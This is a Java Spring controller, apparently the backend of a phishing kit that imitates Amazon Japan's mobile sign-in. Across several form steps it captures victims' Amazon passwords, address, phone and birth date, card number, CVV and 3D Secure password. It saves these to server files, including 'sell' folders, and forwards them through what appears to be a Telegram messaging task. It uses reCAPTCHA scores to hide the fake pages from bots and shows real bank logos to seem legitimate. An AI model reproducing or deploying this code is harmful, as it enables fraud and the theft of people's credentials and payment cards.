package com.kidd.amazon.web;


import cn.hutool.core.date.DateUtil;
import cn.hutool.core.io.FileUtil;
import cn.hutool.core.io.file.FileAppender;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.useragent.UserAgent;
import cn.hutool.http.useragent.UserAgentUtil;
import cn.hutool.json.JSONUtil;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.kidd.amazon.common.IpUtils;
import com.kidd.amazon.model.enums.CardType;
import com.kidd.amazon.service.CacheService;
import com.kidd.amazon.task.AsyncTask;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.util.StringUtils;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.math.BigDecimal;
import java.time.Clock;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.HashMap;
import java.util.Map;


@Controller
@Slf4j
public class Amazon2MobileController {
    @Autowired
    private HttpServletRequest request;

    @Autowired
    private AsyncTask asyncTask;


    @Autowired
    private HttpServletResponse response;

    @Autowired
    private CacheService cacheService;


    @Value("${google.secret:6LcEYsUaAAAAAAfTzIt86eSq8Yc0ljLMqzcoJMmF}")
    private String googleSecret;


    @GetMapping("/version2/mobile/signin")
    public Object signin(@RequestHeader("User-Agent") String uaStr) {
        String ip = IpUtils.getIpAddress(request);
        String path = "/root/countClickLink2.txt";
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd HH:mm:ss");
        if (!FileUtil.exist(path)) {
            FileUtil.newFile(path);
        }
        FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
        fileAppender.append(timeStr + ":" + "|" + ip);
        fileAppender.flush();
        return "version2/mobile/index";
    }

    @GetMapping("/")
    public Object signin2(@RequestHeader("User-Agent") String uaStr) {
        String ip = IpUtils.getIpAddress(request);
        Integer isBot = (Integer) cacheService.getCommonCache(ip + "checkBot");
        if (null != isBot && isBot == 1) {
            return "redirect:/version2/mobile/signin";
        }
        return "index";
    }

    @RequestMapping("/amazon/checkBot")
    @ResponseBody
    public Object checkBotAndRedirect(@RequestHeader("User-Agent") String uaStr, @RequestParam("response") String response) {
        String googleUrl = "https://www.recaptcha.net/recaptcha/api/siteverify";
        String defaulRedirectUrl = "https://amazon.co.jp/?Your_Account_Verified";
        String redirectUrl = defaulRedirectUrl;
        Map<String, Object> postParam = new HashMap<>();
        postParam.put("secret", googleSecret);
        postParam.put("response", response);
        String ip = IpUtils.getIpAddress(request);
        //判定爬虫
        try {
            long start = System.currentTimeMillis();
            String result = HttpRequest.post(googleUrl)
                    .form(postParam)
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .timeout(3000)//超时，毫秒
                    .execute()
                    .body();
            long end = System.currentTimeMillis();
            JSONObject jsonResult = JSON.parseObject(result);

            //得分
            if (null != jsonResult && jsonResult.containsKey("score")) {
                BigDecimal score = ((BigDecimal) jsonResult.get("score"));
                log.info("checkBot:" + ip + ":" + score + ":" + (end - start) + "ms");
                if (score.doubleValue() >= 0.3) {
                    redirectUrl = "/version2/mobile/signin";
                    addCookie("checkBot", "notBot");
                    cacheService.setCommonCache(ip + "checkBot", 1);
                } else {
                    addCookie("Bot", "Bot");
                    cacheService.setCommonCache(ip + "checkBot", -1);
                }
            } else {
                log.error("checkBot api failed:{},{},cost:{}ms", ip, result, (end - start));
                redirectUrl = "/version2/mobile/signin";
            }
        } catch (Exception e) {
            cacheService.setCommonCache(ip + "checkBot", 1);
            log.error("checkBotAndRedirect ip:{}, error:{}",ip, e.getMessage());
            redirectUrl = "/version2/mobile/signin";
        }
        return redirectUrl;
    }

    @GetMapping("/version2/mobile/homepage/billing")
    public Object update_billing() {
        return "version2/mobile/billing";
    }

    @GetMapping("/version2/mobile/homepage/card")
    public Object card() {
        return "version2/mobile/card";
    }

    @GetMapping("/version2/mobile/homepage/secure")
    public Object secure(Model model) {
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
        String binInfo = userInfoMap.get("binInfo");

        CardType cardType = CardType.getBydes(userInfoMap.get("cardType"));
        String cardNumber = userInfoMap.get("cardnumber");
        String bankImage = getBankImageByBinInfo(cardNumber, binInfo);
        String namecard = userInfoMap.get("namecard");
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy/MM/dd");
        model.addAttribute("dateTime", timeStr);
        model.addAttribute("cardName", namecard);
        model.addAttribute("cardNo", cardNumber.substring(cardNumber.length() - 4, cardNumber.length()));
        model.addAttribute("image", cardType.getImageName());
        if (!StringUtils.isEmpty(bankImage)) {
            model.addAttribute("bankImage", "card/a3/" + bankImage);
        }
        return "version2/mobile/secure2";
    }

    @GetMapping("/version2/mobile/homepage/success")
    public Object success() {
        //TODO 不
        addCookie("kiddIp", IpUtils.getIpAddress(request));
        return "version2/mobile/success";
    }

    public void addCookie(String key, String value) {
        Cookie cookie = new Cookie(key, value);//创建新cookie
        cookie.setMaxAge(60 * 60);// 设置存在时间为5分钟
        cookie.setPath("/");//设置作用域
        response.addCookie(cookie);//将cookie添加到response的cookie数组中返回给客户端
    }

    @PostMapping("/version2/mobile/signin")
    @ResponseBody
    public Object signinPost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("AmazonId", params.get("email") != null ? params.get("email")[0] : "");
        userInfoMap.put("AmazonPwd", params.get("password") != null ? params.get("password")[0] : "");
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/version2-step1/%s.txt", timeStr), userInfoMap);
        return new HashMap<String, String>() {{
            put("data", "ok");
        }};
    }

    @PostMapping("/version2/mobile/homepage/billing")
    @ResponseBody
    public Object billingPost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("fullname", params.get("fullname") != null ? params.get("fullname")[0] : "");
        userInfoMap.put("stat", params.get("stat") != null ? params.get("stat")[0] : "");
        userInfoMap.put("address", params.get("address") != null ? params.get("address")[0] : "");
        userInfoMap.put("city", params.get("City") != null ? params.get("City")[0] : "");
        userInfoMap.put("zipcode", params.get("zipcode") != null ? params.get("zipcode")[0] : "");
        userInfoMap.put("phone", params.get("phonenumber") != null ? params.get("phonenumber")[0] : "");
        userInfoMap.put("dob", params.get("dob-year")[0] + "/" + params.get("dob-moon")[0] + "/" + params.get("dob-day")[0]);
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/version2-step2/%s.txt", timeStr), userInfoMap);
        return new HashMap<String, String>() {{
            put("data", "ok");
        }};
    }

    @PostMapping("/version2/mobile/homepage/card")
    @ResponseBody
    public Object cardPost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
        userInfoMap.put("namecard", params.get("namecard")[0]);
        userInfoMap.put("cardnumber", params.get("cardnumber")[0]);
        userInfoMap.put("expire", params.get("month")[0] + "/" + params.get("year")[0]);
        userInfoMap.put("cvv", params.get("cvc")[0]);
        CardType cardType = CardType.detect(params.get("cardnumber")[0]);
        userInfoMap.put("cardType", cardType.getDescription());
        String binInfo = getBinInfo(params.get("cardnumber")[0]);
        userInfoMap.put("binInfo", binInfo);
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/version2-step3/%s.txt", timeStr), userInfoMap);
        asyncTask.asyncSaveFish("/root/lack" + timeStr + "/", userInfoMap);
        asyncTask.asyncSaveFish("/root/sell" + timeStr + "/", userInfoMap);
        return new HashMap<String, String>() {{
            put("data", "ok");
        }};
    }

    @PostMapping("/version2/mobile/homepage/secure")
    @ResponseBody
    public Object securePost() {
        Map<String, String[]> params = request.getParameterMap();
        HttpSession session = request.getSession();
        Map<String, String> userInfoMap = (Map<String, String>) session.getAttribute("userInfo");
        if (null != params.get("mmname")) {
            userInfoMap.put("webid", params.get("mmname") != null ? params.get("mmname")[0] : "");
        }
        userInfoMap.put("3dSecret", params.get("passvbv") != null ? params.get("passvbv")[0] : "");
        session.setAttribute("userInfo", userInfoMap);
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
        asyncTask.asyncWriteMap(String.format("/root/version2-step4/%s.txt", timeStr), userInfoMap);
        asyncTask.asyncSendTgMsg(null, null, userInfoMap);
        asyncTask.asyncSaveFish("/root/full" + timeStr + "/", userInfoMap);
        asyncTask.asyncSaveFish("/root/sell" + timeStr + "/", userInfoMap);
        return new HashMap<String, String>() {{
            put("data", "ok");
        }};
    }

    private String getBinInfo(String cardNo) {
        String binInfo = "{}";
        try {
            binInfo = HttpRequest.get("https://lookup.binlist.net/" + cardNo)
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .header("Accept-Version", "3")
                    .timeout(20000)//超时，毫秒
                    .execute().body();
        } catch (Exception e) {
            log.error("query bin fail:" + e.getMessage());
        }
        JSONObject jsonObject = JSON.parseObject(binInfo);
        if (jsonObject != null && jsonObject.containsKey("country")) {
            jsonObject.remove("country");
        }
        if (jsonObject != null && jsonObject.containsKey("number")) {
            jsonObject.remove("number");
        }
        return jsonObject.toJSONString();
    }

    @GetMapping("/zipcode")
    @ResponseBody
    public Object zipcode(@RequestParam("zipcode") String zipCode, Model model) {
        String jstr = "";
        try {
            Map parm = new HashMap<String, String>();
            parm.put("zipcode", zipCode);
            String result = HttpRequest.post("http://zipcloud.ibsnet.co.jp/api/search")
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .form(parm)//表单内容
                    .timeout(20000)//超时，毫秒
                    .execute().body();
            cn.hutool.json.JSONObject jobj = JSONUtil.parseObj(result);
            jstr = JSONUtil.toJsonStr(jobj);
        } catch (Exception e) {
            HashMap<String, Object> map = new HashMap<>();
            map.put("status", 500);
            map.put("message", null);
            map.put("results", null);
            jstr = JSONUtil.toJsonStr(map);
        }
        return jstr;
    }

    private String getBankImageByBinInfo(String cardNumber,String binInfo) {
        String bankImage = "";
        if (null != binInfo) {
            JSONObject binJson = JSON.parseObject(binInfo);
            if (binJson.containsKey("bank")) {
                JSONObject bankJSON = binJson.getJSONObject("bank");
                if (bankJSON.containsKey("name")) {
                    String bankName = bankJSON.getString("name");
                    if (bankName.contains("SUMITOMO MITSUI") || bankName.contains("MITSUI SUMITOMO") || bankName.contains("WELLS FARGO BANK")) {
                        return "smbc.gif";
                    }
                    if(bankName.toUpperCase().contains("UC CARD")){
                        return "uc.png";
                    }
                    if(bankName.toUpperCase().contains("APLUS")){
                        return "aplus.jpg";
                    }
                    if(bankName.toUpperCase().contains("UFJ")){
                        return "mufg.jpg";
                    }
                    if(bankName.toUpperCase().contains("AEON")){
                        return "aeon.png";
                    }
                    if(bankName.toUpperCase().contains("RAKUTEN")){
                        return "rakuten.png";
                    }
                    if(bankName.toUpperCase().contains("CREDIT SAISON")){
                        return "creditsaison.png";
                    }
                    if(bankName.toUpperCase().contains("LIFECARD")){
                        return "lifecard.png";
                    }
                    if(bankName.toUpperCase().contains("NANTO")){
                        return "nanto.gif";
                    }
                    if(bankName.toUpperCase().contains("EPOS")){
                        return "epos.jpg";
                    }
                    if(bankName.toUpperCase().contains("OMC CARD")){
                        return "omc.png";
                    }
                    if(bankName.toUpperCase().contains("TOYOTA")){
                        return "toyota.png";
                    }
                }
                else {
                    if(cardNumber.contains("467924") ||cardNumber.contains("464988")){
                        return "paypay.gif";
                    }
                }

            }
        }
        return bankImage;
    }

    @GetMapping("/version2/testIsMobile")
    @ResponseBody
    public Object testIsMobile(String uaStr) {
        Boolean isMobile = false;
        UserAgent ua = UserAgentUtil.parse(uaStr);
        isMobile = ua.isMobile();
        return isMobile;
    }
}
